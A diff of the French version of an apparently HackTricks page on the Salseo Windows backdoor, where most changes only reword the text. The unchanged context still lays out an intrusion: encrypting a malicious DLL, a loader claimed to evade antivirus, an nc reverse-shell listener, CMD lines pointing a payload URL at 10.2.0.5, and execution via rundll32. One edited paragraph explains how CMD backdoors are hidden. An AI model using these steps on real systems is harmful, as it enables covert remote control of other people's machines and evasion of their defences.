@@ -62,13 +62,13 @@ Salseo est un backdoor puissant pour les systèmes Windows qui utilise une techn
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, vous avez maintenant tout ce dont vous avez besoin pour exécuter tout le truc Salseo : le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**
+Ok, vous avez maintenant tout ce dont vous avez besoin pour exécuter tout le processus Salseo : le **fichier EvilDalsa.dll encodé** et le **binaire de SalseoLoader.**
 
 **Téléchargez le binaire SalseoLoader.exe sur la machine. Il ne devrait pas être détecté par un quelconque antivirus...**
 
 ## **Exécuter la porte dérobée**
 
-### **Obtenir un shell inversé TCP (téléchargement du fichier dll encodé via HTTP)**
+### **Obtenir un shell TCP inversé (téléchargement du fichier dll encodé via HTTP)**
 
 N'oubliez pas de démarrer un nc en tant qu'écouteur de shell inversé et un serveur HTTP pour servir le fichier evilsalsa encodé.
 ```
@@ -117,7 +117,7 @@ Ouvrez le projet SalseoLoader à l'aide de Visual Studio.
 
 ![](<../.gitbook/assets/image (4) (1) (1) (1).png>)
 
-Dans votre dossier de projet, les fichiers suivants sont apparus: **DllExport.bat** et **DllExport\_Configure.bat**
+Les fichiers suivants sont apparus dans votre dossier de projet: **DllExport.bat** et **DllExport\_Configure.bat**
 
 ### **Désinstallez** DllExport
 
@@ -139,7 +139,7 @@ Sélectionnez **x64** (si vous allez l'utiliser dans une boîte x64, c'était mo
 
 **\[DllExport]** ne doit plus être marqué comme une erreur
 
-![](<../.gitbook/assets/image (8) (1) (1).png>)
+![](<../.gitbook/assets/image (8) (1).png>)
 
 ### Compilez la solution
 
@@ -178,7 +178,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les hackers peuvent utiliser CMD pour exécuter des commandes malveillantes, telles que la création de backdoors ou la suppression de fichiers importants. Il est important de surveiller l'utilisation de CMD sur les systèmes pour détecter toute activité suspecte.
+CMD (Command Prompt) est un outil intégré dans Windows qui permet aux utilisateurs d'interagir avec le système d'exploitation en utilisant des commandes textuelles. Les backdoors peuvent être créées en utilisant des commandes CMD pour exécuter des scripts malveillants ou pour ouvrir des ports pour une connexion à distance. Les backdoors CMD peuvent être cachées en utilisant des noms de fichiers aléatoires ou en les plaçant dans des dossiers système. Les backdoors CMD peuvent être détectées en surveillant les connexions réseau sortantes et en recherchant des processus suspects en cours d'exécution.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -194,7 +194,7 @@ rundll32.exe SalseoLoader.dll,main
 * Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre entreprise annoncée dans HackTricks ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
